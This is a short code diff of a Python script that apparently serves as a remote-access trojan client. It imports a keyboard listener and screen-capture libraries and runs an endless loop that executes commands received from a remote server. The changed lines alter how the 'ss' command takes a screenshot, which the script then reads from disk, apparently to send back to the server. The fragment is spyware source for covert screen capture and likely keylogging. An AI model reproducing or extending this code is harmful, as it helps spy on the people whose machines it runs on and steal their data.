@@ -12,6 +12,7 @@ import pyautogui
 import numpy as np 
 import cv2
 import pyscreenshot as ImageGrab
+import pynput
 from pynput.keyboard import Listener,Key 
 import platform
 
@@ -204,8 +205,8 @@ while True:  # An infinite loop to execute multiple commands recieved from serve
 
         if data[:].decode() == "ss":
             s.send("clicking".encode())
-            im=ImageGrab.grab()
-            im.save("screenshot.jpg")
+            #im=ImageGrab.grab()
+            pyautogui.screenshot("screenshot.jpg")
             f=open("screenshot.jpg","rb")
             data=f.read()
 
